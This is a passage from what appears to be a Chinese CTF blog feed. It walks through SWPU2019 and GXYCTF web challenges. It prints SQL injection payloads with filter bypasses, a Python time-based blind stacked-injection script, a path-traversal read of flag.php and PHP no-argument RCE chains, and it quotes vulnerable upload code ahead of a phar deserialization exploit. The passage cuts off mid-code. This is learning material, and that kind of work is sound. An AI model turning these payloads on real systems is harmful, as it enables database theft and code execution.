class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/2.jpg" alt="字段"><br>确认了回显的是2和3对应字段。那么接下来如何解决<code>information_schema</code>的问题呢？这里我从官方wp中学到了bypass<code>information_schema</code>的方法参考这一篇文章<br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>仔细想想，information_schema在注入中不可或缺的原因无非是因为它包含了所有其他数据库的信息，主要是table_schema，table_name.column_name等等。那么有没有具有类似功能的存在呢？文章中提供了一种解法:<code>sys.schema_auto_increment_columns</code>该视图的作用就是用来对表自增ID的监控。如果表中存在自增id,那么这个视图就会包含这一 表。所以我们的解法是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_colum ns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p>然后难过了，回显居然是这个表不存在？！也不知道是不是这道题在buuoj上少了啥，毕竟我用的跟官方wp是一样的……那就没办法了，只能盲猜一些常见表名，比如user，password之类的。这里就开个天眼表示是users表吧。<br>接下来由于不知道列名，引入一个以前自己不怎么熟悉的点：无列名注入，这里看到一篇文章讲的很准确：<br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</a><br>这里直接引用它的数据了：<br>普通的sql注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| id | name         | password                                 | email                       | birthdate  | added               |</span><br><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">|  1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 |</span><br><span class="line">|  2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 |</span><br><span class="line">|  3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 |</span><br><span class="line">|  4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 |</span><br><span class="line">|  5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |</span><br><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,5 ,6union select * from users</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| 1 | 2            | 3                                        | 4                           | 5          | 6                   |</span><br><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| 1 | 2            | 3                                        | 4                           | 5          | 6                   |</span><br><span class="line">| 1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 |</span><br><span class="line">| 2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 |</span><br><span class="line">| 3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 |</span><br><span class="line">| 4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 |</span><br><span class="line">| 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |</span><br><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>这时若要引用，使用反引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;4&#96; from (select 1,2,3,4,5,6 union select * from users)a;</span><br></pre></td></tr></table></figure><p>则会单独拿到第四列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">| veronica80@example.org      |</span><br><span class="line">| sawayn.amelie@example.com   |</span><br><span class="line">| stefan41@example.com        |</span><br><span class="line">| zwalsh@example.com          |</span><br><span class="line">| pattie.medhurst@example.net |</span><br><span class="line">+-----------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>如果反引号被过滤了，也有其他方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b,4,5 union select * from users)a;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| b                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">| veronica80@example.org      |</span><br><span class="line">| sawayn.amelie@example.com   |</span><br><span class="line">| stefan41@example.com        |</span><br><span class="line">| zwalsh@example.com          |</span><br><span class="line">| pattie.medhurst@example.net |</span><br><span class="line">+-----------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>回到题目，不难得出最终payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>昨天晚上写了写web1,折腾的够呛。今天在复现web4时也挺难受的，所幸最后还是做出来了。<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/3.jpg" alt="登录框"><br>题目所给def注册功能并没有开放，而登录键点了也没有反应。抓包的话会有新发现：<img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/4.jpg" alt="注入"><br>如果只有单引号的话，会报错。但是如果输入结果除了单引号还有分号的话，返回的仍是202。这代表了什么呢？首先可以确认是注入，同时还可以大致判断是堆叠注入。<br>关于堆叠注入我并没有什么了解。于是去搜索了下，发现这几年开始有堆叠注入的ctf题在各大赛事中出现。其特点无非是：限制了常用的select,update等等关键语句。但是却没有限制你的分号使用，也就是说，我们可以一次执行多条sql语句。而如果适当搭配，一样可以起到注入的效果。<br>根据官方的说法，这是属于PDO场景下的sql注入，出题人给的方法就是用16进制加mysql预处理来解决。其payload大致格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @a&#x3D;0x&#123;0&#125;;PREPARE ctftest from @a;execute ctftest;</span><br></pre></td></tr></table></figure><p>前面的@a即为我们所需的注入语句的16进制变量，后面<code>PREPARE ctftest from @a;execute ctftest;</code>两句起到了定义并执行预处理语句的作用<br>那么盲注脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://094a7801-436a-4a50-9b73-ea921af6361c.node3.buuoj.cn/index.php?r=Login/Login"</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``."</span>:</span><br><span class="line">        sql = <span class="string">"select if((ascii(substr((select group_concat(flag) from flag),"</span>+str(i)+<span class="string">",1))='"</span>+str(ord(str1))+<span class="string">"'),sleep(6),2);"</span>   <span class="comment"># ctf</span></span><br><span class="line">        sql_hex = str_to_hex(sql)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"1\';SET @a=0x"</span>+str(sql_hex)+<span class="string">";PREPARE st FROM @a;EXECUTE st;"</span>,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"123"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result=requests.post(url,json=data,timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#glzjinwantsaliendzip</span></span><br><span class="line"><span class="comment">#glzjinnts_a_girl_friendzip</span></span><br><span class="line"><span class="comment">#glzjinwantsgirliendzip</span></span><br><span class="line"><span class="comment">#glzjin_wants_a_girl_friend.zip</span></span><br></pre></td></tr></table></figure><p>这里可能由于buuoj的问题吧，访问过快直接429,导致每次跑出的结果都不一样。最后汇总下才推断出来是glzjin_wants_a_girl_friend.zip。(这里直接select flag from flag了，实在不想又去爆表爆列了。。）<br>拿到源码，审计不提了。直接说出题人思路吧：<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/5.jpg" alt="审计"><br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/6.jpg" alt="利用"><br>发现会读取img_file内容并以base64输出。那么只要img_file包含flag.php就好了。<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;User&#x2F;Index&amp;img_file&#x3D;&#x2F;..&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>即可从源码处解码拿到flag<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/7.jpg" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF--禁止套娃&amp;BabaySqli-v3.0</title>
      <link href="2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&amp;BabaySqli-v3.0/"/>
      <url>2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&amp;BabaySqli-v3.0/</url>
      
        <content type="html"><![CDATA[<p>今天也来接着做下GXY的几道web题</p><h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h1><p>首先是禁止套娃这一道，题目类型为无参RCE。我也是通过这一道题才了解到无参RCE这个名词，不过后来仔细想想，原来做过的BugKu的过狗一句话也有相似之处……</p><p>话不多说，先给出我参考的文章：</p><a id="more"></a><p><a href="https://www.gem-love.com/websecurity/530.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/530.html</a><br>前面的师傅里面提到了sky师傅的博文，所以我也参考了下。</p><p>那么首先，出现无参RCE的必要条件是什么呢？大抵是如下的正则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里?R是引用当前表达式的意思，那么配上前面的成分，我们被允许的参数值必须具有以下形式：<br>a(b(c())<br>a()<br>而不是a(‘342’)之类的。</p><p>那么回到题目上来，首先网页并没有太多信息，那么我们常规几板斧拿出来：1.抓包，有没有有用的信息？2.网页源码，有没有提示？3.源码泄露，git,svn等等试一遍4.扫目录，看有没有有趣的目录可以发掘5.实在不行看看题目的名字，网页的框架，有没有提示你可能存在的漏洞  。我个人认为正常的题目这样做肯定可以继续发展下去而不至于一筹莫展。<br>当然，此处是很常见的.git源码泄露，我们把githack拿下来的index.php看一看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>到这就可以确认是无参RCE了，那么现在来小结下如何应对无参RCE以及如何过这里的正则：<br>首先明确一点，基于无参RCE的格式要求，我们可利用的有很多，其中主要包括全局变量以及返回值有特殊性的函数。甚至可以像sky那样，通过getallheaders()拿到环境变量，使自己传参的参数变为可控的，进而执行命令。<br>那么回到题目上，现在肯定第一步是看看目录了，从sky那学到的常规手法，是getcwd()获得当前目录，scandir(getcwd())获得当前目录的文件。而如果要往上层目录看的话，就利用dirname()，使用scandir(dirname(getcwd()))。不过这里我试了下好像不太行，所以改用其他方法：<br>我们知道，scandir()读当前目录的用法是scandir(‘.’),但这里的’.’要怎么获得呢？那就要涉及到一个高级用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current(localeconv())</span><br></pre></td></tr></table></figure><p>本地试一下结果：<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/1.jpg" alt="localeconv"><br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/2.jpg" alt="current(localeconv)"><br>后者之返回一个点，是完全可以利用了。<br>扫目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/3.jpg" alt="dir"></p><p>那么接下来就要读flag.php了，这里我们当然只能利用flag.php在返回的数组中的键值来操作下。如果flag.php是数组最后一个数值的话，直接end()就解决了。不过这里是倒数第二个，所以有其他方法操作：<br>1.运气法<br>hhh因为是靠随机数，我认为干脆叫运气使然好了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array_flip(scandir(current(localeconv()))))</span><br></pre></td></tr></table></figure><p>这里array_rand()不多说，就是随机获得数组中一个下标，而array_flip则可以交换键与值。那么返回的就变成值了。<br>因为这里只有五个文件，我们用随机数完全不用关心其随机性。</p><p>2.使用array_reverse加上next()，把数组逆过来后，flag.php变成第二个元素，恰巧是数组名指针下一个，使用next()即可。</p><p>最后，使用readfile()或highlight_file读文件即可<br>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=print_r(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure><h1 id="BabySqli-v3-0"><a href="#BabySqli-v3-0" class="headerlink" title="BabySqli v3.0"></a>BabySqli v3.0</h1><p>phar反序列化的题目。其实从去年10月份到现在自己已经听过无数次phar反序列化的漏洞了，而且学校里师傅们也一直在整相关的pop链什么的，因此寒假一定要解决这个知识点（好像已经欠了不少知识……ssrf从去年8月到现在还没有系统的好好学过……）</p><p>这道题也算是自己的第一道phar反序列化的题目吧，整体不算难。<br>不过比赛时的师傅们可能不这么想，因为这道题的名字容易把人引向sql注入上，但其实登录界面就是个弱口令admin password。估计坑了不少人吧。</p><p>登录进去后，看到一个文件上传(现在的文件上传题很多就是phar的知识点，比如红帽杯)<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/4.jpg" alt="上传"></p><p>同时注意到有file参数为upload，可能是个文件包含的点。因此我们尝试一下访问，发现确实存在upload.php.同理，可以确认有flag.php。但显然被ban了。因此再回到file参数上，除了直接的文件包含，当然也可以用伪协议试试，于是成功拿到home.php源码。解码后得：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $Filename;</span><br><span class="line"><span class="keyword">public</span> $cmd;</span><br><span class="line"><span class="keyword">public</span> $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">$ext = <span class="string">".txt"</span>;</span><br><span class="line">@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $sandbox;</span><br><span class="line"><span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"[^a-z0-9]"</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('illegal filename!');"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('you are too big (′▽`〃)');"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"move_uploaded_file('"</span>.$file[<span class="string">'tmp_name'</span>].<span class="string">"', '"</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">"');"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $sandbox;</span><br><span class="line"><span class="keyword">global</span> $ext;</span><br><span class="line"><span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[<span class="string">"file"</span>]);</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"下面是你上传的文件：&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>到这里就有点以前反序列化的意思了，而之所以题目是phar反序列化，就是因为phar的优势就在于可以在伪造文件类型的同时利用phar://来进行反序列化。那我们直接看看要如何利用：<br>首先是找可控参数，我们找到name参数是通过get传的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br></pre></td></tr></table></figure><p>之后在找可以执行命令的点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span 